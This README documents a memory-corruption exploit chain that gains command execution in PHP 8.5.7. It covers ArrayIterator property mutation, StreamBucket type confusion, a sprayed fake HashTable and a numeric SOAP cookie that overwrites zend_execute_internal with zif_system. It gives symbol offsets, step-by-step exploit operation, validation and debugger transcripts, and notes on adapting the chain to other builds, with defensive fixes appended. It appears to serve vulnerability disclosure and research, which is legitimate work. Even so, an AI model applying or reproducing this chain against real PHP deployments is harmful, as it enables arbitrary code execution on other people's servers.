# PHP 8.5.7 StreamBucket to SOAP Numeric Cookie RCE RPoC

Status: locally validated command execution in the PHP process.

Affected version analyzed: PHP `8.5.7`.

Latest branch context: PHP.net listed PHP `8.5.7` as the current PHP 8.5 release on 04 Jun 2026.

Impact: controlled internal-property type confusion can be chained into a fake `HashTable` write and then into native code execution through `zend_execute_internal`.

Validated proof signal:

```text
overwrite_returned
marker_check=present
marker_content=PHP857_RCE
```

## Files

- `poc/rpoc.php` - single-file PHP RPoC.
- `scripts/validate.sh` - replay wrapper that runs the RPoC with a supplied PHP binary and verifies the marker.
- `evidence/local-validation.txt` - fresh local replay transcript.
- `evidence/gdb-proof.txt` - sanitized debugger proof for the canonical hook overwrite and `zif_system` hit.
- `SHA256SUMS.txt` - artifact checksums.

## Tested Target

The replay was validated against a local PHP `8.5.7` CLI build with `soap`, `SPL`, `standard`, and stream filter support enabled.

Binary identity:

```text
php-8.5.7-release-soap-curl/sapi/cli/php
sha256: 1cfdac46f8b1db810dca17f900754fba45915c9c89783cebfa3ceae2224b5058
```

Relevant symbol offsets in that binary:

```text
zend_execute_internal = php_base + 0x1ce3030
zif_system            = php_base + 0x69f130
```

The RPoC derives the PIE base from `/proc/self/maps` at runtime and computes both absolute addresses from those offsets.

## Requirements

- Linux or WSL-style `/proc/self/maps` and `/proc/self/mem` access from the PHP process.
- A PHP `8.5.7` CLI binary matching the symbol offsets above.
- Enabled extensions/classes:
  - `SPL`
  - `SoapClient`
  - `StreamBucket`
  - user stream filters
- Local loopback networking for the in-process SOAP response server.

The proof intentionally uses a local loopback SOAP server so the cookie parsing and `zend_symtable_update()` path is exercised without requiring an external service.

## Quick Replay

Run with an explicit PHP binary:

```bash
bash scripts/validate.sh /path/to/php-8.5.7/sapi/cli/php
```

Equivalent environment-variable form:

```bash
PHP_BIN=/path/to/php-8.5.7/sapi/cli/php bash scripts/validate.sh
```

Expected successful output:

```text
php_base=0x...
zend_execute_internal=0x...
zif_system=0x...
numeric_cookie_name=...
fake_arData=0x...
hash_slot=0x... hash_index=0x... hash_mask=0x...
marker_path=/tmp/php857_rce_<pid>.txt
victim_bucket_ptr=0x...
fake_marker=RH...
fake_hash_address=0x...
overwrite_returned
marker_check=present
marker_content=PHP857_RCE
```

The marker file contains:

```text
PHP857_RCE
```

## Chain Overview

The chain uses three PHP engine and extension behaviors together:

1. `ArrayIterator` can mutate object properties in a way that bypasses normal typed-property invariants for internal objects.
2. `StreamBucket` validation checks the `bucket` property as a resource but later trusts the `data` property as a string.
3. SOAP response cookie storage writes through `SoapClient::_cookies` with `zend_symtable_update()`.

The resulting path:

```text
ArrayIterator property mutation
  -> forged StreamBucket::$data
  -> php_stream_bucket_attach() string macro type confusion
  -> heap pointer disclosure and controlled overread
  -> attacker-shaped fake HashTable in heap string storage
  -> SoapClient::_cookies replaced with fake HashTable pointer
  -> numeric Set-Cookie name processed by zend_symtable_update()
  -> zend_hash_index_update() writes canonical zif_system pointer
  -> zend_execute_internal overwritten
  -> dynamic internal call enters zif_system(command)
```

## Root Cause Details

### Internal Property Mutation

`ArrayIterator` accepts an object and exposes offset assignment over its property storage. For affected internal objects, that assignment can place values into properties that normally have private visibility, typed constraints, or readonly constraints.

The RPoC uses:

```php
$it = new ArrayIterator($object);
$it[$property] = $value;
```

Two object types matter:

- `StreamBucket`
- `SoapClient`

For `StreamBucket`, the chain changes `data` to a non-string pointer value while keeping `bucket` as a valid bucket resource. For `SoapClient`, the chain changes private `_cookies` from a real array zval to an integer value whose bits are treated as a `HashTable *`.

### StreamBucket Type Confusion

`php_stream_bucket_attach()` validates only the bucket resource first:

```text
zend_read_property(..., "bucket", ...)
zend_fetch_resource_ex(..., PHP_STREAM_BUCKET_RES_NAME, ...)
```

Later it reads `data`, dereferences it, and uses string macros:

```text
zend_read_property(..., "data", ...)
Z_STRLEN_P(pzdata)
Z_STRVAL_P(pzdata)
```

The missing type check makes the `data` zval usable as a fake `zend_string *` pointer. With a real bucket resource still present, the filter path reaches the trusted string macro use.

### Pointer Disclosure

The RPoC creates a real stream bucket and then creates a fake `StreamBucket` object:

```text
fake->bucket = real bucket resource
fake->data   = chosen integer pointer
```

When the chosen integer points into another live bucket object, `Z_STRLEN_P()` and `Z_STRVAL_P()` read from attacker-selected structure offsets. That provides a stable heap overread. The first stage leaks a `php_stream_bucket *`; the second stage uses that pointer to overread the bucket data area that contains many sprayed fake `HashTable` strings.

### Fake HashTable Placement

The RPoC sprays strings containing fake `HashTable` headers:

```text
gc.refcount       = 1
gc.type_info      = IS_ARRAY
flags             = 0
nTableMask        = selected mask
arData            = zend_execute_internal - 16
nNumUsed          = 0
nNumOfElements    = 0
nTableSize        = 1
nInternalPointer  = 0
nNextFreeElement  = 0
pDestructor       = 0
```

The fake table is embedded in ordinary heap string storage. The overread locates the sprayed marker and derives the fake `HashTable` address.

The important steering value is:

```text
arData = zend_execute_internal - 16
```

`Bucket.h` sits at offset `+16` inside a mixed-array bucket. When a new integer-key bucket is added at index zero, `p->h` lands exactly on `zend_execute_internal`.

### Hash Slot Selection

`zend_hash_index_update()` computes:

```text
nIndex = h | ht->nTableMask
```

The RPoC needs the lookup/add path to avoid crashing before the bucket write. It scans the PHP binary's writable mapping for a four-byte `HT_INVALID_IDX` value that can serve as the hash slot for the chosen `h`.

The selected fake `nTableMask` makes:

```text
HT_HASH_EX(arData, h | nTableMask) == HT_INVALID_IDX
```

That lets the add path proceed into the steered `Bucket` write.

### SOAP Numeric Cookie Pivot

An earlier direct string-key write attempt can overwrite `zend_execute_internal`, but only with a string hash. Zend string hashes force the high bit:

```text
hash | 0x8000000000000000
```

That produces a non-canonical code pointer for normal PHP text addresses and blocks reliable function-pointer use.

SOAP response cookie handling provides the needed pivot. It stores response cookies with:

```text
zend_symtable_update(Z_ARRVAL_P(cookies), name.s, &zcookie)
```

`zend_symtable_update()` checks whether the key string is numeric. A cookie name made from the decimal address of `zif_system` is numeric, so the update path becomes:

```text
zend_hash_index_update(ht, zif_system_address, &zcookie)
```

The integer-key add path writes:

```text
p->h = h
p->key = NULL
ZVAL_COPY_VALUE(&p->val, pData)
```

Because `h` is the numeric key itself, `p->h` becomes the canonical `zif_system` address. With `arData` set to `zend_execute_internal - 16`, that writes:

```text
zend_execute_internal = zif_system
```

### Hook Trigger

The proof uses a dynamic internal call:

```php
$trigger = 'md5';
$trigger($command);
```

The VM reaches the internal-call handler path that consults `zend_execute_internal`. After the overwrite, the call target becomes:

```text
zif_system(execute_data, return_value)
```

The original call's first argument is the command string:

```text
printf PHP857_RCE > /tmp/php857_rce_<pid>.txt
```

`zif_system` parses that argument and executes it, creating the marker file.

## RPoC Operation

`poc/rpoc.php` performs the following steps:

1. Read `/proc/self/maps` and locate the PHP binary PIE base.
2. Compute `zend_execute_internal` and `zif_system`.
3. Choose a numeric cookie name equal to the decimal `zif_system` address.
4. Scan writable PHP binary mappings through `/proc/self/mem` for a compatible invalid hash slot.
5. Register two user stream filters:
   - one filter sprays fake `HashTable` strings and leaks a victim bucket pointer;
   - one filter uses the leaked pointer as a fake string source and overreads the sprayed data.
6. Derive the fake `HashTable` address from the sprayed marker.
7. Start a loopback SOAP response server.
8. Replace `SoapClient::_cookies` with the fake `HashTable` address.
9. Trigger `SoapClient->__soapCall()` and process the numeric `Set-Cookie` response.
10. Call a dynamic internal function with the command string.
11. Exit after the marker command has run.

## Local Validation

Fresh local validation:

```text
php_base=0x000056063aa00000
zend_execute_internal=0x000056063c6e3030
zif_system=0x000056063b09f130
numeric_cookie_name=94584760299824
fake_arData=0x000056063c6e3020
hash_slot=0x000056063c65f4e0 hash_index=0xfffdf130 hash_mask=0xc4f40000
marker_path=/tmp/php857_rce_689.txt
victim_bucket_ptr=0x00007fc17ba72d20
fake_marker=RH5f1b8eca000015 index=15 offset=148232
fake_hash_address=0x00007fc17ba97018
overwrite_returned
marker_check=present
marker_content=PHP857_RCE
```

The replay transcript is stored in:

```text
evidence/local-validation.txt
```

Debugger proof:

```text
watch_zend_execute_internal value=0x555555a9f130
#0 _zend_hash_index_add_or_update_i(...) at Zend/zend_hash.c:1187
#2 zend_symtable_update(...) at Zend/zend_hash.h:492

hit_zif_system execute_data=0x7ffff40159d0 return_value=0x7fffffffa8c0
#0 zif_system(...) at ext/standard/exec.c:250
#1 ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER() at Zend/zend_vm_execute.h:2029
```

The debugger transcript is stored in:

```text
evidence/gdb-proof.txt
```

## Why The Numeric Cookie Is Required

The fake `HashTable` write can place several useful fields at chosen offsets:

```text
Bucket.val     at arData + 0
Bucket.h       at arData + 16
Bucket.key     at arData + 24
```

For string keys, `Bucket.h` comes from `ZSTR_H(key)`. Zend deliberately sets the high bit of string hashes, so even a carefully chosen string-key preimage becomes:

```text
0x8000... | target_address
```

That value is not a canonical PHP text pointer on x86-64. The VM does not safely call it as a function pointer.

For numeric keys, `Bucket.h` is the integer index. SOAP's `zend_symtable_update()` makes numeric cookie names reach the integer-index path. That is the RCE-enabling step: it writes the exact canonical address of `zif_system`.

## Reliability Notes

The replay is deterministic on the tested build after the fake table is found. ASLR is handled by reading the current process mappings. Heap placement is handled by spraying 1024 fake table strings and locating the selected one through the StreamBucket overread.

The proof is build-specific because it uses symbol offsets for:

```text
zend_execute_internal
zif_system
```

For a different PHP build, recompute offsets from the target binary:

```bash
readelf -sW /path/to/php | grep -E 'zend_execute_internal|zif_system'
```

The RPoC expects the same structure layout and the same vulnerable extension behavior. Distribution patches, debug builds, sanitizer builds, different compiler options, or changed extension layouts may require offset updates or small heap-shaping changes.

## Defensive Fixes

The strongest fix is to stop the initial invariant break:

- `ArrayIterator` object-property assignment should not bypass normal typed-property, readonly, visibility, and property-handler checks for internal objects.

Additional hardening:

- `php_stream_bucket_attach()` should verify `StreamBucket::$data` is a string immediately before `Z_STRLEN_P()` and `Z_STRVAL_P()`.
- SOAP cookie handling should verify `SoapClient::_cookies` is an array before `SEPARATE_ARRAY()` and every `Z_ARRVAL_P()` use.
- Internal property access through `OBJ_PROP_NUM()` should be audited when followed by release-build-only `ZEND_ASSERT()` assumptions.
- Typed public properties in internal classes should not be treated as permanently trustworthy after object exposure to userland mutation surfaces.

## Triage Checklist

Confirm exposure:

```bash
php -n -m | grep -E 'soap|SPL|standard'
```

Confirm symbol offsets:

```bash
readelf -sW /path/to/php | grep -E 'zend_execute_internal|zif_system'
```

Confirm runtime requirements:

```bash
test -r /proc/self/maps
test -r /proc/self/mem
```

Run replay:

```bash
bash scripts/validate.sh /path/to/php
```

Successful marker:

```text
marker_check=present
marker_content=PHP857_RCE
```

## Limitations

- The included RPoC targets the tested PHP `8.5.7` binary layout.
- The command-execution trigger uses `zif_system`; environments that disable `system()` or compile the standard extension differently need a different internal function target.
- The concise replay reads `/proc/self/maps` and `/proc/self/mem`. A remote-only exploit would need to replace those with the available disclosure primitives and target-specific memory discovery.
- The local loopback SOAP response server is a delivery mechanism for the numeric cookie update path. Real deployment reachability depends on whether attacker-controlled SOAP responses or equivalent cookie processing can be driven in the target scenario.
- The proof demonstrates process-level command execution after the property-corruption and memory-disclosure primitives are available. It is not a universal drop-in exploit for every PHP deployment without target adaptation.

## References

- PHP downloads: https://www.php.net/downloads.php
- PHP 2026 news archive: https://www.php.net/archive/2026.php
- PHP supported versions: https://www.php.net/supported-versions.php
- PHP source repository: https://github.com/php/php-src

## Responsible Use

Run only against local research targets, owned systems, or explicitly authorized lab environments.
